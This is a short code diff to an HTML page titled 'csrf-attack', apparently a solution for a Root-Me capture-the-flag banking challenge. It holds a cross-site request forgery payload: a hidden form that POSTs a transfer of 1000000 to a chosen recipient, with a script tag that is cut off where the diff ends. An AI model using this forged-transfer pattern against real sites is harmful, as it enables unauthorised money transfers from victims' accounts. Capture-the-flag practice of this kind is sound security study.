@@ -7,8 +7,9 @@
     <title>csrf-attack</title>
 </head>
 <body>
-   <from action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="POST">
-    <input type="hidden" name="recipient" value="azer">
+    <h1>Transferring funds...</h1>
+   <from id="csrf-form" action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="POST">
+    <input type="hidden" name="recipient" value="luna">
     <input type="hidden" name="amount" value="1000000">
    </from>
    <script>
